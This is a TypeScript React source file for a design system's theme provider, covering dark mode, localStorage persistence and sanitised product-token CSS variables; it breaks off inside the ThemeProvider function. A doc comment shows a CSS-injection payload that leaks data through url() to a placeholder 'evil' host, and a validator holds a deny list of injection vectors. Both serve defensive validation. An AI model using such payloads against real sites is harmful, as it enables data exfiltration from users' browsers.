'use client'

/**
 * Lando Labs Design System - Theme Provider
 * Manages theme state and provides theme context to the application
 *
 * Features:
 * - Light/dark mode switching
 * - System preference detection
 * - LocalStorage persistence
 * - Product-specific theme overrides (multi-brand architecture)
 * - SSR-safe theme initialization
 */

import React, { createContext, useContext, useEffect, useState, useCallback, useRef } from 'react'
import type { ModeAwareTokenValue, ProductTheme } from '../tokens'
import type { ShadowLayer } from '../tokens/shadows'
import { getThemePreset, DEFAULT_THEME_PRESET } from '../tokens/themePresets'
import {
  composeBoxShadow,
  composeDuration,
  composeEasing,
  composeSpacing,
} from './tokens-web'
// #384 — `themeScript` is a pure string-producing utility and lives in its own
// module (no `'use client'`) so RSC code can call it. We re-export it here to
// preserve the historical import path `from '@lando-labs/lando-ds'`
// (which surfaces via this module → ../utils/index.ts → ../index.ts).
import {
  STORAGE_KEY,
  PRODUCT_THEME_KEY,
  THEME_PRESET_KEY,
  themeScript,
  themeScriptPath,
  presetColorVars,
  type ThemeScriptOptions,
} from './themeScript'
// #11 — the scoped ramp/interaction-state re-derivation ThemeScope needs.
// See colorDerivation.ts for why this can't just live in tokens.css alone.
import { getScopedDerivedColorVars } from './colorDerivation'

export { themeScript, themeScriptPath, presetColorVars }
export type { ThemeScriptOptions }

/**
 * Dev-only warning. Stripped from production bundles via the `NODE_ENV` guard so
 * shipping apps stay quiet. Mirrors the guard used by other components.
 */
function devWarn(message: string): void {
  if (process.env.NODE_ENV !== 'production') {
    console.warn(message)
  }
}

/**
 * CSS-injection guard for `ProductTheme.tokens` VALUES (#323).
 *
 * `applyTheme` writes consumer-supplied token values into
 * `documentElement.style.setProperty('--x', value)`. A custom property is just
 * an opaque token until it is substituted via `var(--x)` into a real
 * declaration — at that point a value carrying `;` breaks out of the intended
 * declaration:
 *
 *   --x: `red; background: url(http://evil/?leak)`
 *   color: var(--x)   →   color: red; background: url(http://evil/?leak)
 *
 * `url(...)` turns that into a CSS exfiltration channel, and `@import` / `<` / `>`
 * etc. open further injection surfaces. We therefore reject any value containing
 * a known break-out / injection vector and SKIP writing it (fail-safe: the token
 * simply falls back to its DS default; we never throw).
 *
 * Keys are NOT validated here — they are DS-controlled (`--color-*`, `--spacing-*`,
 * …) composed from a category + key, not free-form attacker input.
 *
 * The check is case-insensitive and substring-based: legitimate token values
 * (hex, `oklch(...)`, `1.5rem`, `var(--x)`, `color-mix(...)`) contain none of
 * these vectors, so the allow-by-default posture stays ergonomic while the
 * dangerous shapes are denied.
 *
 * @param value Candidate CSS value (already composed to a string).
 * @returns `true` when safe to write; `false` to skip.
 */
export function isSafeTokenValue(value: string): boolean {
  // #323 — reject absurdly long values. No legitimate token value approaches
  // this (a complex gradient/shadow is well under 500 chars); a megabyte-scale
  // value serves only to amplify style-recalc cost across every consumer.
  if (value.length > 500) return false
  const haystack = value.toLowerCase()
  // Each entry is a literal injection vector. `;{}` break out of a declaration
  // or block; `url(` enables network exfiltration; `/*` `*/` smuggle via
  // comments; `<` `>` `\\` enable markup/escape tricks; `expression(` is legacy
  // IE script-in-CSS; `@import` / a bare `@` pull in at-rules (@import, @media…).
  const INJECTION_VECTORS = [
    ';',
    '{',
    '}',
    'url(',
    '/*',
    '*/',
    '<',
    '>',
    '\\',
    'expression(',
    '@import',
    '@',
  ]
  return !INJECTION_VECTORS.some((vector) => haystack.includes(vector))
}

/**
 * CSS-injection guard for `ProductTheme.tokens` KEYS (post-#384 skeptic review).
 *
 * `applyTheme` composes `--<cat>-<key>` from `Object.entries(productTheme.tokens)`,
 * where `cat` and `key` are PROPERTY NAMES of the (possibly-parsed-from-
 * localStorage) `productTheme` object. The DS contract assumes those keys are
 * DS-controlled, but anything that can write to localStorage — XSS on a sibling
 * subdomain, a malicious browser extension — can craft hostile keys like
 * `"foo;}.attacker{"` or names with zero-width unicode that look innocuous but
 * compose into something dangerous.
 *
 * The browser's `setProperty` normalizes/rejects most non-`ident` property names
 * silently, but that is a "rely on the browser" posture. The DS already
 * validates VALUES via {@link isSafeTokenValue}; leaving keys unvalidated is an
 * asymmetric defense. Mirror the value pattern with a strict regex:
 *
 *   - Allow only `[a-z0-9_-]` (CSS custom-property idents are case-insensitive,
 *     and DS keys follow a known shape — short, kebab-case, alphanumeric).
 *   - Length cap 100 chars (DS keys are short; `--color-text-primary` is 19).
 *
 * Tighter than the CSS spec on purpose: DS-controlled keys never need anything
 * outside this charset, and forbidding the rest closes the asymmetric defense.
 *
 * @param name Candidate key (either category or per-token key).
 * @returns `true` when safe to compose into a `--*` property name.
 */
export function isSafeTokenKey(name: string): boolean {
  if (typeof name !== 'string') return false
  if (name.length === 0 || name.length > 100) return false
  return /^[a-z0-9_-]+$/i.test(name)
}

/**
 * Type guard: structural check for the mode-aware `{ light, dark }` shape (#370).
 *
 * The mode-aware shape lets `ProductTheme.tokens` carry both a `light` value
 * and a `dark` value for a single token; `applyTheme` picks the side that
 * matches the current `ResolvedTheme` and re-applies on mode toggle. Flat
 * values (the legacy shape) stay supported and fall through `resolveMode-
 * AwareTokenValue` unchanged.
 *
 * Recursion is NOT supported: `{ light: { light: '#…' } }` is treated as a
 * one-level unwrap — the inner `{ light, dark }` does not get resolved a second
 * time.
 */
function isModeAwareTokenValue(value: unknown): value is ModeAwareTokenValue<unknown> {
  return (
    typeof value === 'object' &&
    value !== null &&
    !Array.isArray(value) &&
    'light' in value &&
    'dark' in value
  )
}

/**
 * Resolve a token value to the side that matches the current `ResolvedTheme`.
 *
 * - Flat values (primitives, arrays for shadows/easing, plain strings) pass
 *   through unchanged so the legacy shape stays supported.
 * - `{ light, dark }` values are unwrapped to the appropriate side.
 *
 * Caller is responsible for composing + injection-screening the resolved value.
 */
function resolveModeAwareTokenValue(
  value: unknown,
  resolvedTheme: ResolvedTheme,
): unknown {
  if (isModeAwareTokenValue(value)) {
    return resolvedTheme === 'dark' ? value.dark : value.light
  }
  return value
}

/**
 * Format a `ProductTheme.tokens` override value into a CSS-compatible string.
 *
 * Tokens at rest are platform-agnostic primitives (numbers, structured shadow
 * layers, easing tuples). When a `ProductTheme` overrides them, we need to
 * compose CSS strings before writing them as CSS custom properties.
 *
 * Strings pass through unchanged so color overrides (the most common case)
 * continue to work as before.
 *
 * Mode-aware `{ light, dark }` values are resolved to the side matching
 * `resolvedTheme` (#370) before composition — the resolver runs first so the
 * injection screen runs on the FINAL composed string.
 *
 * The composed string is then screened by {@link isSafeTokenValue}: a value
 * carrying a CSS-injection vector (`;`, `url(`, `@import`, …) is rejected so the
 * caller skips the `setProperty` write. This is the single chokepoint for the
 * consumer-supplied-value → `setProperty` sink (#323).
 *
 * Returns `null` when the value isn't shaped for the given category OR fails the
 * injection screen — caller should skip the assignment in that case.
 */
function formatTokenValueForCss(
  category: string,
  value: unknown,
  resolvedTheme: ResolvedTheme,
): string | null {
  const resolved = resolveModeAwareTokenValue(value, resolvedTheme)
  const composed = composeTokenValueForCss(category, resolved)
  if (composed === null) return null
  if (!isSafeTokenValue(composed)) {
    devWarn(
      `[ThemeProvider] Skipped unsafe token value for category "${category}": ` +
        `${JSON.stringify(composed)}. Values containing CSS-injection vectors ` +
        `(';', 'url(', '@import', etc.) are rejected. See reference/csp.md.`,
    )
    return null
  }
  return composed
}

/**
 * Compose a `ProductTheme.tokens` override value into a CSS string by category.
 * Pure formatting only — the injection screen lives in
 * {@link formatTokenValueForCss}, which wraps this. Splitting the two keeps the
 * (well-exercised) composition logic separate from the security gate.
 */
function composeTokenValueForCss(
  category: string,
  value: unknown,
): string | null {
  if (value === null || value === undefined) return null
  if (typeof value === 'string') return value

  if (typeof value === 'number') {
    switch (category) {
      case 'spacing':
      case 'radius':
        return composeSpacing(value)
      case 'animation':
        // Numeric values in the `animation` category are durations (ms).
        return composeDuration(value)
      case 'typography':
        // Typography numbers cover both font-size (px) and letter-spacing
        // (em). We can't distinguish here without the key, so fall back to
        // `px` — letter-spacing overrides should pass strings (`'0.05em'`).
        return composeSpacing(value)
      default:
        return String(value)
    }
  }

  if (Array.isArray(value)) {
    // Shadow layers: array of ShadowLayer or the literal 'none' (caught above
    // as a string). Structural duck-type rather than a strict type-guard.
    if (
      category === 'shadows' &&
      value.length > 0 &&
      typeof value[0] === 'object' &&
      value[0] !== null &&
      'x' in value[0] &&
      'y' in value[0] &&
      'blur' in value[0] &&
      'color' in value[0]
    ) {
      return composeBoxShadow(value as readonly ShadowLayer[])
    }
    // Easing tuples: 4-tuple of numbers.
    if (
      category === 'animation' &&
      value.length === 4 &&
      value.every((v) => typeof v === 'number')
    ) {
      return composeEasing(value as unknown as readonly [number, number, number, number])
    }
    return null
  }

  return null
}


export type ThemeMode = 'light' | 'dark' | 'system'
export type ResolvedTheme = 'light' | 'dark'

/**
 * ProductTheme categories whose consumed CSS-var prefix is NOT `--<category>-*`.
 * `shadows` is flat but SINGULAR in the var namespace (components read
 * `--shadow-*`, the export is `shadows`).
 */
const PRODUCT_FLAT_VAR_PREFIX: Record<string, string> = { shadows: 'shadow' }

/**
 * ProductTheme categories whose token shape is nested one level, where the
 * SUB-OBJECT key is the consumed var prefix — components read `--font-family-*`,
 * `--font-size-*`, `--font-weight-*`, `--line-height-*`, `--letter-spacing-*`
 * (typography) and `--duration-*`, `--easing-*` (animation), never
 * `--typography-*` / `--animation-*`. Only these PRIMITIVE groups map to vars;
 * the composite scales in the same token export (`typography.display/heading/
 * body/label/code`, the `animation.fadeIn/slideInUp/…` keyframe presets, and
 * `animation.delay` — no `--delay-*` var ships) are intentionally skipped.
 * Before #480 the old
 * `--<category>-<key>` path wrote `--typography-*`/`--animation-*` AND composed
 * the nested object to `null`, so font/shadow/animation product overrides
 * silently did nothing.
 */
const PRODUCT_NESTED_VAR_GROUPS: Record<string, ReadonlySet<string>> = {
  typography: new Set(['fontFamily', 'fontSize', 'fontWeight', 'lineHeight', 'letterSpacing']),
  animation: new Set(['duration', 'easing']),
}

/** camelCase → kebab-case for a CSS-var segment (`fontFamily` → `font-family`). */
function productVarSegment(key: string): string {
  return key.replace(/([a-z0-9])([A-Z])/g, '$1-$2').toLowerCase()
}

/**
 * Numeric typography leaves carry per-group units that the generic `typography`
 * number path (`composeSpacing` → `px`) gets wrong: `fontWeight` and `lineHeight`
 * are UNITLESS and `letterSpacing` is `em`. The public type steers consumers to
 * numbers (`Partial<typeof typography>`, and the DS's own tokens are numeric), so
 * normalize a bare number to the correct CSS string here — without this,
 * `lineHeight: 1.5` would write `1.5px` (a silent, catastrophic value). Strings
 * pass through untouched; `fontSize` numbers stay `px` (correct); non-typography
 * categories are untouched (animation composes via its own `duration`/`easing`
 * numeric path). #480.
 */
function normalizeTypographyLeaf(category: string, group: string, value: unknown): unknown {
  if (category !== 'typography' || typeof value !== 'number') return value
  switch (group) {
    case 'fontWeight':
    case 'lineHeight':
      return String(value) // unitless
    case 'letterSpacing':
      return `${value}em` // web-native em
    default:
      return value // fontSize → px (correct); fontFamily numbers are nonsensical
  }
}

/**
 * Write the `--*` custom properties for one ProductTheme category into `vars`,
 * mapping each override to the var the DS actually consumes (#480). Flat
 * categories (`color`, `spacing`, `radius`, and the renamed `shadows`→`shadow`)
 * write `--<prefix>-<key>`; nested categories (`typography`, `animation`) recurse
 * one level into their primitive groups. Every value still flows through
 * {@link formatTokenValueForCss}, so the mode resolver and the #323 injection
 * screen are unchanged. `category` is already `isSafeTokenKey`-validated by the
 * caller; keys inside are validated here (post-#384, keys may be attacker-shaped).
 */
function writeProductCategoryVars(
  vars: Record<string, string>,
  category: string,
  tokens: Record<string, unknown>,
  mode: ResolvedTheme,
): void {
  const warnUnsafeKey = (path: string): void =>
    devWarn(
      `[ThemeProvider] Skipped unsafe token key "${path}". ` +
        `Keys must match /^[a-z0-9_-]+$/i (length ≤ 100).`,
    )
  const write = (varName: string, value: unknown): void => {
    const formatted = formatTokenValueForCss(category, value, mode)
    if (formatted !== null) vars[varName] = formatted
  }

  const nestedGroups = PRODUCT_NESTED_VAR_GROUPS[category]
  if (nestedGroups) {
    for (const [group, groupTokens] of Object.entries(tokens)) {
      // Allowlist gates the group name (composite scales are skipped silently,
      // and an attacker-supplied group can only match a known-safe literal).
      if (!nestedGroups.has(group)) continue
      if (!groupTokens || typeof groupTokens !== 'object') continue
      const prefix = productVarSegment(group)
      for (const [key, value] of Object.entries(groupTokens as Record<string, unknown>)) {
        if (!isSafeTokenKey(key)) {
          warnUnsafeKey(`${category}.${group}.${key}`)
          continue
        }
        write(`--${prefix}-${key}`, normalizeTypographyLeaf(category, group, value))
      }
    }
    return
  }

  const prefix = PRODUCT_FLAT_VAR_PREFIX[category] ?? category
  for (const [key, value] of Object.entries(tokens)) {
    if (!isSafeTokenKey(key)) {
      warnUnsafeKey(`${category}.${key}`)
      continue
    }
    write(`--${prefix}-${key}`, value)
  }
}

interface ThemeContextValue {
  /** Current theme mode (light, dark, or system) */
  mode: ThemeMode

  /** Resolved theme (light or dark) - accounts for system preference */
  theme: ResolvedTheme

  /** Set theme mode */
  setMode: (mode: ThemeMode) => void

  /** Toggle between light and dark */
  toggle: () => void

  /** Current product theme (if any) */
  productTheme?: ProductTheme

  /** Set product-specific theme */
  setProductTheme: (theme: ProductTheme | undefined) => void

  /** Current theme preset ID */
  themePreset: string

  /** Set theme preset */
  setThemePreset: (presetId: string) => void

  /** Whether theme is being loaded from storage */
  isLoading: boolean
}

const ThemeContext = createContext<ThemeContextValue | undefined>(undefined)

// Storage keys live in `themeScript.ts` so the pre-hydration script body and
// the runtime persistence helpers share a single source of truth (#384).

const getSystemTheme = (): ResolvedTheme => {
  if (typeof window === 'undefined') return 'light'

  const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches
  return prefersDark ? 'dark' : 'light'
}

/**
 * Read the persisted theme mode, returning `null` when no value is stored.
 * Lets callers distinguish "user has an explicit preference" from "fall back
 * to defaultMode / initialMode" (#381).
 */
const getStoredModeRaw = (): ThemeMode | null => {
  if (typeof window === 'undefined') return null

  try {
    const stored = localStorage.getItem(STORAGE_KEY)
    if (stored === 'light' || stored === 'dark' || stored === 'system') {
      return stored
    }
  } catch (error) {
    console.warn('Failed to read theme from localStorage:', error)
  }

  return null
}

const getStoredProductTheme = (): ProductTheme | undefined => {
  if (typeof window === 'undefined') return undefined

  try {
    const stored = localStorage.getItem(PRODUCT_THEME_KEY)
    if (stored) {
      return JSON.parse(stored) as ProductTheme
    }
  } catch (error) {
    console.warn('Failed to read product theme from localStorage:', error)
  }

  return undefined
}

/**
 * Read the persisted theme preset, returning `null` when nothing valid is
 * stored (#440). Mirrors {@link getStoredModeRaw}: lets the mount effect
 * distinguish "user has an explicit persisted preset" from "fall back to the
 * declared `preset` prop / default." Returning `null` (rather than coercing
 * the missing case to `DEFAULT_THEME_PRESET`) is what lets the fallback chain
 * keep a declared `preset` instead of clobbering it.
 */
const getStoredThemePresetRaw = (): string | null => {
  if (typeof window === 'undefined') return null

  try {
    const stored = localStorage.getItem(THEME_PRESET_KEY)
    if (stored && getThemePreset(stored)) {
      return stored
    }
  } catch (error) {
    console.warn('Failed to read theme preset from localStorage:', error)
  }

  return null
}

const storeMode = (mode: ThemeMode): void => {
  if (typeof window === 'undefined') return

  try {
    localStorage.setItem(STORAGE_KEY, mode)
  } catch (error) {
    console.warn('Failed to store theme in localStorage:', error)
  }
}

const storeProductTheme = (theme: ProductTheme | undefined): void => {
  if (typeof window === 'undefined') return

  try {
    if (theme) {
      localStorage.setItem(PRODUCT_THEME_KEY, JSON.stringify(theme))
    } else {
      localStorage.removeItem(PRODUCT_THEME_KEY)
    }
  } catch (error) {
    console.warn('Failed to store product theme in localStorage:', error)
  }
}

const storeThemePreset = (presetId: string): void => {
  if (typeof window === 'undefined') return

  try {
    localStorage.setItem(THEME_PRESET_KEY, presetId)
  } catch (error) {
    console.warn('Failed to store theme preset in localStorage:', error)
  }
}

const resolveTheme = (mode: ThemeMode): ResolvedTheme => {
  if (mode === 'system') {
    return getSystemTheme()
  }
  return mode
}

/**
 * DS-owned attributes that {@link computeThemeAttrs} may set on a scope. Only
 * `data-theme` is unconditional; the other three are set when their condition
 * holds and REMOVED when it doesn't (so a swap that drops a preset/product/
 * tint doesn't leave a stale attribute behind). Used by `applyTheme` to know
 * which attributes to `removeAttribute` when absent from the computed set.
 */
const OPTIONAL_SCOPE_ATTRIBUTES = [
  'data-tint-chrome',
  'data-theme-preset',
  'data-product',
] as const

/**
 * The set of `data-*` attributes + `--*` custom properties + `color-scheme`
 * that a theme resolves to — with NO DOM writes. This is the pure core shared
 * by two consumers (#428):
 *
 *   - `applyTheme` writes the result imperatively via
 *     `setAttribute` / `setProperty` (the runtime `ThemeProvider` path).
 *   - `ThemeScope` spreads the result inline during RENDER, so the scope lands
 *     in server HTML and is correct from first paint (no `useEffect` flash).
 *
 * Keeping the computation pure is what makes SSR-correct scoped theming
 * possible: the same attribute/var set can be emitted as JSX attributes on the
 * server and re-applied on the client with no divergence.
 *
 * Security: product token values still flow through `formatTokenValueForCss`
 * (mode-aware resolution + `isSafeTokenValue` screen); preset values through
 * `isSafeTokenValue`. Unsafe values are dropped here, so neither consumer can
 * write them. Keys are screened by `isSafeTokenKey`.
 *
 * @param mode        Resolved light/dark mode.
 * @param productTheme Optional product theme override.
 * @param presetId    Optional theme-preset id (e.g. `'lando'`, `'midnight'`).
 * @param tintChrome  Whether to set the `data-tint-chrome` boolean attribute.
 * @param deriveScopedTokens (#11) When `true`, seed `vars` with the tonal-ramp
 *        + interaction-state `color-mix()` FORMULAS (`getScopedDerivedColorVars`)
 *        before preset/product vars are layered on. `:root`'s formulas in
 *        tokens.css already re-derive correctly for `documentElement` (the
 *        `applyTheme` root path), so only `ThemeScope` — which targets a
 *        non-root wrapper the `:root` CSS rule can't reach — passes `true`.
 *        Leaving this `false`/omitted keeps the root path byte-for-byte
 *        unchanged.
 * @returns `{ attributes, vars, colorScheme }` — attributes to SET (absent
 *          optional ones should be removed by the caller), `--*` vars to write,
 *          and the `color-scheme` value.
 */
export function computeThemeAttrs(
  mode: ResolvedTheme,
  productTheme?: ProductTheme,
  presetId?: string,
  tintChrome?: boolean,
  deriveScopedTokens?: boolean,
): {
  attributes: Record<string, string>
  vars: Record<string, string>
  colorScheme: ResolvedTheme
} {
  const attributes: Record<string, string> = { 'data-theme': mode }
  // #11 — scoped ramp/state formulas go in FIRST, at the lowest precedence:
  // a preset's or product theme's explicit literal (e.g. a preset's own
  // `primaryHover` hex) still overwrites the formula below, exactly like the
  // inline preset/product writes already outrank tokens.css's `:root` CSS on
  // the root path.
  const vars: Record<string, string> = deriveScopedTokens ? getScopedDerivedColorVars(mode) : {}

  // Opt-in brand-tinted chrome: boolean attribute (empty-string value) gates
  // the `[data-tint-chrome]` token block.
  if (tintChrome) {
    attributes['data-tint-chrome'] = ''
  }

  // Theme preset: attribute + color overrides. `presetColorVars` is the single
  // source of truth for the preset.colors → `--color-*` mapping (#337); screen
  // each value with `isSafeTokenValue` just as the product-token path does.
  if (presetId) {
    attributes['data-theme-preset'] = presetId
    const presetVars = presetColorVars(presetId)
    for (const [key, value] of Object.entries(presetVars)) {
      if (isSafeTokenValue(value)) {
        vars[key] = value
      }
    }
  }

  // Product theme: attribute + per-token CSS vars. Tokens are platform-agnostic
  // primitives at rest; format each override into a CSS string per category.
  //
  // #370 — values may be flat (legacy) OR mode-aware `{ light, dark }`.
  // `formatTokenValueForCss` resolves the mode-aware shape against `mode`
  // BEFORE composing + screening, so re-applying on a mode change picks up the
  // right side and dark↔light toggling works again.
  if (productTheme) {
    attributes['data-product'] = productTheme.name

    Object.entries(productTheme.tokens).forEach(([category, tokens]) => {
      // Post-#384 — keys come from a parsed-from-localStorage object whose
      // PROPERTY NAMES are not guaranteed DS-controlled (hostile browser
      // extension, sibling-subdomain XSS). Validate both `cat` and `key`
      // with the same posture as `isSafeTokenValue` so an unsafe identifier
      // never reaches `--cat-key` composition.
      if (!isSafeTokenKey(category)) {
        devWarn(
          `[ThemeProvider] Skipped unsafe token category "${category}". ` +
            `Categories must match /^[a-z0-9_-]+$/i (length ≤ 100).`,
        )
        return
      }
      if (tokens && typeof tokens === 'object') {
        // #480 — map each override to the var the DS actually consumes:
        // typography/animation are nested (→ `--font-*` / `--duration-*`/`--easing-*`),
        // `shadows` is singular (`--shadow-*`); color/spacing/radius stay 1:1.
        writeProductCategoryVars(vars, category, tokens as Record<string, unknown>, mode)
      }
    })
  }

  return { attributes, vars, colorScheme: mode }
}

/**
 * Apply a theme to a target element and return the set of `--*` custom
 * properties that were written in this call. The caller passes the set of
 * keys that were written by the PREVIOUS call so this function can remove
 * any stale keys before writing the new set — fixing the `setProductTheme`
 * cleanup leak (`task_2c2ebf2f`), where keys from theme A persist after
 * swapping to theme B or to `undefined`.
 *
 * The default target is `document.documentElement` (the global `:root`
 * behavior `ThemeProvider` has always had). `ThemeScope` (#395) passes its
 * own wrapper element so a sub-tree can carry product theme tokens without
 * stomping the global `:root` — enabling per-section theme previews, multi-
 * brand pages, and "this re-themes" living demos.
 *
 * The attribute/var computation is delegated to the pure
 * {@link computeThemeAttrs}; this function is the imperative DOM-write half
 * (setAttribute / setProperty / removeProperty). Behavior is identical to the
 * previous inlined version.
 *
 * Sink invariant (#323): only `setProperty` / `removeProperty` are used —
 * never `cssText` assignment. The guard in
 * `src/test/no-reparsing-style-sink.test.ts` pins this contract; the scoped
 * call path (`targetEl !== documentElement`) inherits the same invariant
 * because the write sink is structurally identical.
 *
 * @param targetEl   Element to write tokens / attributes onto.
 * @param theme      Resolved light/dark mode.
 * @param productTheme  Optional product theme override.
 * @param presetId   Optional theme-preset id (e.g. `'ocean'`, `'midnight'`).
 * @param tintChrome Toggles the `data-tint-chrome` attribute on `targetEl`.
 * @param previousKeys Set of `--*` keys the prior `applyTheme` call wrote on
 *                     this same target; used to diff + `removeProperty` stale.
 */
export const applyTheme = (
  targetEl: HTMLElement,
  theme: ResolvedTheme,
  productTheme?: ProductTheme,
  presetId?: string,
  tintChrome?: boolean,
  previousKeys: ReadonlySet<string> = new Set(),
): Set<string> => {
  if (typeof document === 'undefined') return new Set()

  const { attributes, vars, colorScheme } = computeThemeAttrs(
    theme,
    productTheme,
    presetId,
    tintChrome,
  )

  // Set the computed attributes; remove any optional DS attribute that the
  // computed set omits (mirrors the prior add/remove discipline — a dropped
  // preset/product/tint must clear its stale attribute). `data-theme` is
  // always present, so it is never removed.
  for (const [name, value] of Object.entries(attributes)) {
    targetEl.setAttribute(name, value)
  }
  for (const name of OPTIONAL_SCOPE_ATTRIBUTES) {
    if (!(name in attributes)) {
      targetEl.removeAttribute(name)
    }
  }

  // Track every `--*` key written in THIS call so the caller can diff
  // against the previous call and `removeProperty` the stale ones.
  const writtenKeys = new Set<string>()
  for (const [key, value] of Object.entries(vars)) {
    targetEl.style.setProperty(key, value)
    writtenKeys.add(key)
  }

  // Set color-scheme for native form elements.
  targetEl.style.colorScheme = colorScheme

  // Remove any custom properties that were written by the previous call but
  // are absent from this one (e.g. `setProductTheme(undefined)`, swapping
  // theme A → theme B, swapping presets, etc). Without this, properties
  // from the prior theme stay on `targetEl.style` indefinitely —
  // invisible at first paint, very visible in theme-builder UX where users
  // expect a reset to actually reset.
  for (const key of previousKeys) {
    if (!writtenKeys.has(key)) {
      targetEl.style.removeProperty(key)
    }
  }

  return writtenKeys
}

interface ThemeProviderProps {
  /**
   * Fallback theme mode when nothing else is set (no `initialMode`, no
   * persisted localStorage value). Defaults to `'system'`.
   *
   * NOTE on `'system'` and SSR: when `defaultMode === 'system'`, the server
   * cannot know the user's OS preference and will render assuming `'light'`,
   * then `useEffect` syncs to the real `prefers-color-scheme`. That's fine
   * for most apps. If you need SSR + first paint to match an already-known
   * mode (cookie-based theming, edge middleware), pass {@link initialMode}
   * instead — it skips the system-preference resolution path for first render.
   */
  defaultMode?: ThemeMode

  /**
   * Server-resolved initial mode (#381). When provided, this concrete value
   * is used for the FIRST render — both on the server and on the client until
   * hydration completes. `useTheme().mode` returns this value pre-hydration,
   * so SSR markup matches the first client render with no `ThemeCookieSync`
   * workaround needed.
   *
   * Use this when the resolved theme is known at request time (e.g. read from
   * a `theme` cookie in a Next.js Server Component or edge middleware) — pass
   * it through to the provider so the rendered HTML and the client agree.
   *
   * Difference from `defaultMode`:
   *   - `defaultMode` is the FALLBACK when nothing else is set (it can be
   *     `'system'`, which causes a client-side resolution path).
   *   - `initialMode` is "I already know the mode; render this verbatim
   *     until persisted state arrives." It MUST be a concrete `'light'` or
   *     `'dark'`, not `'system'`, because the whole point is to skip the
   *     `prefers-color-scheme` round-trip.
   *
   * After the post-hydration storage sync runs, a persisted user preference
   * in localStorage takes priority over `initialMode` (the user chose to
   * override). When `disableStorage` is true, `initialMode` sticks.
   *
   * **Flicker note**: when SSR-cookie-derived `initialMode` disagrees with the
   * user's persisted localStorage preference, `useTheme().mode` returns
   * `initialMode` on first render and re-renders to the persisted value after
   * the storage-sync effect runs — a visible mode flash on every page load.
   * The mitigation is for the consumer to write the resolved mode to BOTH the
   * cookie AND localStorage on toggle, so the two sources never disagree.
   */
  initialMode?: ResolvedTheme

  /**
   * Declarative theme preset for first render (#440).
   *
   * The library ships brand-neutral by default; a preset (e.g. `'lando'`,
   * `'midnight'`) re-skins the palette. Before this prop the only way in was
   * the imperative, client-only `setThemePreset(id)` — which runs in an effect
   * AFTER first paint, so the app flashed the brand-neutral default → preset
   * on every load. `preset` fixes that: it is the FIRST-render value (used on
   * the server and on the client until hydration), so SSR markup and the first
   * client render agree with no flash.
   *
   * Semantics mirror {@link initialMode} exactly:
   *   - `preset` is the declared/initial value — what renders until persisted
   *     state arrives.
   *   - A persisted user preset in localStorage takes priority AFTER hydration
   *     (the user actively chose it). When `disableStorage` is true, `preset`
   *     sticks.
   *
   * Pair with `themeScript({ defaultPreset })` (same id) to also make the
   * pre-hydration paint apply the preset's colors — the preset analog of how
   * `initialMode` pairs with `themeScript()` for the mode. Unknown ids fall
   * back to the brand-neutral default.
   *
   * A single `preset` prop is intentional (no `initialPreset` alias): unlike
   * mode — where a pre-existing `defaultMode` that can be `'system'` forced a
   * separate concrete `initialMode` — there is no pre-existing `defaultPreset`
   * prop to disambiguate against, so one clearly-named prop is cleaner than two
   * aliases.
   */
  preset?: string

  /** Initial product theme */
  defaultProductTheme?: ProductTheme

  /** Disable localStorage persistence */
  disableStorage?: boolean

  /** Force a specific theme (ignores user preference) */
  forcedTheme?: ResolvedTheme

  /**
   * Opt into brand-tinted chrome. Sets the `data-tint-chrome` boolean attribute
   * on the root element, gating the `[data-tint-chrome]` token block. Not a
   * no-op even for the home brand: enabling it re-anchors dark-mode text to
   * neutral rungs, so Ocean dark becomes slightly less saturated. (v0.26.0)
   */
  tintChrome?: boolean

  /** Children */
  children: React.ReactNode
}

/**
 * ThemeProvider Component
 *
 * Provides theme context and manages theme state.
 *
 * ## SSR / first-paint coordination
 *
 * - For Vite / SPA apps: `defaultMode="system"` is fine — the provider runs
 *   `prefers-color-scheme` on mount and updates.
 * - For Next.js (or any SSR with cookie/header theming): pass a server-
 *   resolved `initialMode={'light' | 'dark'}` so SSR HTML and first client
 *   render agree without a `ThemeCookieSync` workaround (#381). Combine with
 *   `themeScript()` injected in `<head>` to eliminate FOUC across page loads.
 *
 * ## fonts.css and next/font (#381)
 *
 * `@lando-labs/lando-ds/fonts.css` is a SUPPLEMENT, not a replacement,
 * for `next/font`. It contains the `@font-face` declarations for Inter and
 * JetBrains Mono — useful for Vite / non-Next consumers and for ensuring the
 * mono font registers under its DS family name. If you already use
 * `next/font/google` to load Inter, the two coexist (the browser dedupes by
 * source URL where possible). To avoid any double-load: import the DS
 * stylesheet only for the families `next/font` does NOT load for you.
 *
 * @example
 * ```tsx
 * <ThemeProvider defaultMode="system">
 *   <App />
 * </ThemeProvider>
 * ```
 *
 * @example Declarative preset (SSR-safe, no flash) — #440
 * ```tsx
 * // First render uses the `lando` preset on both server and client; a
 * // persisted user preset (if any) wins after hydration. Pair with
 * // `themeScript({ defaultPreset: 'lando' })` in <head> for zero-flash colors.
 * <ThemeProvider preset="lando">
 *   <App />
 * </ThemeProvider>
 * ```
 *
 * @example SSR with cookie-derived theme (Next.js App Router)
 * ```tsx
 * // app/layout.tsx
 * const initialMode = cookies().get('theme')?.value === 'dark' ? 'dark' : 'light'
 * return (
 *   <html data-theme={initialMode}>
 *     <head dangerouslySetInnerHTML={{ __html: themeScript() }} />
 *     <body>
 *       <ThemeProvider initialMode={initialMode}>
 *         {children}
 *       </ThemeProvider>
 *     </body>
 *   </html>
 * )
 * ```
 *
 * @example With product theme
 * ```tsx
 * <ThemeProvider
 *   defaultMode="light"
 *   defaultProductTheme={{
 *     name: 'my-product',
 *     tokens: {
 *       // Flat `color` keys → `--color-<key>`; the base re-skins the ramp + states.
 *       color: {
 *         primary: '#1B7FA8',
 *         'success-base': '#2DBFBF',
 *       },
 *     },
 *   }}
 * >
 *   <App />
 * </ThemeProvider>
 * ```
 *
 * @example Mode-aware product theme (#370)
 * ```tsx
 * <ThemeProvider
 *   defaultProductTheme={{
 *     name: 'my-product',
 *     tokens: {
 *       color: {
 *         // Per-mode background — toggling dark↔light re-applies the right side.
 *         background: { light: '#FFFFFF', dark: '#011219' },
 *         'text-primary': { light: '#0F1419', dark: '#EEF7FA' },
 *         // Flat values still work — applied verbatim in both modes.
 *         primary: '#1B7FA8',
 *       },
 *     },
 *   }}
 * >
 *   <App />
 * </ThemeProvider>
 * ```
 */
export function ThemeProvider({
  defaultMode = 'system',
  initialMode,
  preset,
  defaultProductTheme,
  disableStorage = false,
  forcedTheme,
  tintChrome = false,
  children,
}: ThemeProviderProps): React.JSX.Element {
  const [isLoading, setIsLoading] = useState(true)
  // #381 — `initialMode` (server-resolved) wins on first render. It's
